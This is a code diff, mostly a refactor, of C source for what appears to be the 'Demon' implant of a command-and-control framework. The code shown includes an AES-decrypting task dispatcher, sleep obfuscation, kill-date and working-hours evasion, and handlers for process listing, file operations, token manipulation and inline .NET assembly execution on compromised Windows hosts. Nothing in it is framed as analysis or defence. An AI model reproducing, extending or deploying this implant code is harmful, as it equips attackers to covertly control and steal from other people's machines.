@@ -41,34 +41,36 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = 0, .Function = NULL }
 };
 
+//
+// TODO: rewrite this part
+//       and move it into the Demon.c file
+//
 VOID CommandDispatcher( VOID )
 {
     PARSER   Parser         = { 0 };
-    LPVOID   DataBuffer     = NULL;
-    SIZE_T   DataBufferSize = 0;
+    LPVOID   DataBuffer     = { 0 };
+    SIZE_T   DataBufferSize = { 0 };
     PARSER   TaskParser     = { 0 };
-    LPVOID   TaskBuffer     = NULL;
-    UINT32   TaskBufferSize = 0;
-    UINT32   CommandID      = 0;
-    UINT32   RequestID      = 0;
+    LPVOID   TaskBuffer     = { 0 };
+    UINT32   TaskBufferSize = { 0 };
+    UINT32   CommandID      = { 0 };
+    UINT32   RequestID      = { 0 };
 
     PRINTF( "Session ID => %x\n", Instance.Session.AgentID );
 
-    do
-    {
-        if ( ! Instance.Session.Connected )
+    do {
+        if ( ! Instance.Session.Connected ) {
             break;
+        }
 
         SleepObf();
 
-        if ( ReachedKillDate() )
-        {
+        if ( ReachedKillDate() ) {
             KillDate();
         }
 
-        if ( ! InWorkingHours() )
-        {
-            // simply call SleepObf until we reach working hours or the kill date (if set)
+        // simply call SleepObf until we reach working hours or the kill date (if set)
+        if ( ! InWorkingHours() ) {
             continue;
         }
 
@@ -92,40 +94,33 @@ VOID CommandDispatcher( VOID )
         }
 #endif
 
-        if ( DataBuffer && DataBufferSize > 0 )
-        {
+        if ( DataBuffer && DataBufferSize > 0 ) {
             ParserNew( &Parser, DataBuffer, DataBufferSize );
-            do
-            {
+            do {
                 CommandID  = ParserGetInt32( &Parser );
                 RequestID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
                 Instance.CurrentRequestID = RequestID;
 
-                if ( CommandID != DEMON_COMMAND_NO_JOB )
-                {
+                if ( CommandID != DEMON_COMMAND_NO_JOB ) {
                     PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
-                    if ( TaskBufferSize != 0 )
-                    {
+                    if ( TaskBufferSize != 0 ) {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
                         ParserDecrypt( &TaskParser, Instance.Config.AES.Key, Instance.Config.AES.IV );
                     }
 
-                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ )
-                    {
-                        if ( DemonCommands[ FunctionCounter ].Function == NULL )
+                    for ( UINT32 FunctionCounter = 0 ;; FunctionCounter++ ) {
+                        if ( DemonCommands[ FunctionCounter ].Function == NULL ) {
                             break;
+                        }
 
-                        if ( DemonCommands[ FunctionCounter ].ID == CommandID )
-                        {
+                        if ( DemonCommands[ FunctionCounter ].ID == CommandID ) {
                             DemonCommands[ FunctionCounter ].Function( &TaskParser );
                             break;
                         }
                     }
                 }
-
-                //PRINTF("TaskParser.Length: %x\n", TaskParser.Length);
             } while ( Parser.Length > 12 );
 
             MemSet( DataBuffer, 0, DataBufferSize );
@@ -397,7 +392,7 @@ VOID CommandProc( PPARSER Parser )
 
                         if ( UserDomain.Buffer ) {
                             MemZero( UserDomain.Buffer, UserDomain.Length );
-                            NtHeapFree( UserDomain.Buffer );
+                            MmHeapFree( UserDomain.Buffer );
                             UserDomain.Buffer = NULL;
                         }
                     }
@@ -411,7 +406,7 @@ VOID CommandProc( PPARSER Parser )
                 if ( PtrProcessInfo )
                 {
                     MemSet( PtrProcessInfo, 0, ProcessInfoSize );
-                    NtHeapFree( PtrProcessInfo );
+                    MmHeapFree( PtrProcessInfo );
                     PtrProcessInfo = NULL;
                     SysProcessInfo = NULL;
                 }
@@ -649,7 +644,7 @@ VOID CommandProcList(
 
             if ( UserDomain.Buffer ) {
                 MemZero( UserDomain.Buffer, UserDomain.Length );
-                NtHeapFree( UserDomain.Buffer );
+                MmHeapFree( UserDomain.Buffer );
                 UserDomain.Buffer = NULL;
                 UserDomain.Length = 0;
             }
@@ -668,7 +663,7 @@ VOID CommandProcList(
         /* Free our process list */
         if ( SysProcessPtr ) {
             MemZero( SysProcessPtr, ProcessInfoSize );
-            NtHeapFree( SysProcessPtr );
+            MmHeapFree( SysProcessPtr );
             SysProcessPtr  = NULL;
             SysProcessInfo = NULL;
         }
@@ -809,7 +804,7 @@ VOID CommandFS( PPARSER Parser )
 
             Buffer = ParserGetBytes( Parser, &FileName.Length );
 
-            FileName.Buffer = NtHeapAlloc( FileName.Length + sizeof( WCHAR ) );
+            FileName.Buffer = MmHeapAlloc( FileName.Length + sizeof( WCHAR ) );
             MemCopy( FileName.Buffer, Buffer, FileName.Length );
 
             PRINTF( "FileName => %ls\n", FileName.Buffer )
@@ -874,7 +869,7 @@ VOID CommandFS( PPARSER Parser )
             if ( FileName.Buffer )
             {
                 MemSet( FileName.Buffer, 0, FileName.Length );
-                NtHeapFree( FileName.Buffer );
+                MmHeapFree( FileName.Buffer );
                 FileName.Buffer = NULL;
             }
 
@@ -1629,7 +1624,7 @@ VOID CommandToken( PPARSER Parser )
             /* free queried owner memory */
             if ( User.Buffer ) {
                 MemZero( User.Buffer, User.Length );
-                NtHeapFree( User.Buffer );
+                MmHeapFree( User.Buffer );
                 User.Buffer = NULL;
             }
 
@@ -1717,25 +1712,25 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         BUFFER AssemblyData = { 0 };
         BUFFER AssemblyArgs = { 0 };
 
-        Instance.Dotnet            = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
+        Instance.Dotnet            = MmHeapAlloc( sizeof( DOTNET_ARGS ) );
         Instance.Dotnet->RequestID = Instance.CurrentRequestID;
         Instance.Dotnet->Invoked   = FALSE;
 
         /* Parse Pipe Name */
         Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
-        Instance.Dotnet->PipeName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
+        Instance.Dotnet->PipeName.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->PipeName.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->PipeName.Buffer, Buffer.Buffer, Instance.Dotnet->PipeName.Length );
 
         /* Parse AppDomain Name */
         Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
-        Instance.Dotnet->AppDomainName.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
+        Instance.Dotnet->AppDomainName.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->AppDomainName.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->AppDomainName.Buffer, Buffer.Buffer, Instance.Dotnet->AppDomainName.Length );
 
         /* Parse Net Version */
         Buffer.Buffer = ParserGetWString( Parser, &Buffer.Length );
-        Instance.Dotnet->NetVersion.Buffer = NtHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
+        Instance.Dotnet->NetVersion.Buffer = MmHeapAlloc( Buffer.Length + sizeof( WCHAR ) );
         Instance.Dotnet->NetVersion.Length = Buffer.Length;
         MemCopy( Instance.Dotnet->NetVersion.Buffer, Buffer.Buffer, Instance.Dotnet->NetVersion.Length );
 
@@ -3380,7 +3375,7 @@ VOID CommandExit( PPARSER Parser )
         }
 
         MemSet( SocketEntry, 0, sizeof( SOCKET_DATA ) );
-        NtHeapFree( SocketEntry );
+        MmHeapFree( SocketEntry );
     }
 
     // remove downloads
@@ -3411,7 +3406,7 @@ VOID CommandExit( PPARSER Parser )
     // free the DownloadChunk buffer
     if ( Instance.DownloadChunk.Buffer )
     {
-        NtHeapFree( Instance.DownloadChunk.Buffer );
+        MmHeapFree( Instance.DownloadChunk.Buffer );
         Instance.DownloadChunk.Buffer = NULL;
         Instance.DownloadChunk.Length = 0;
     }
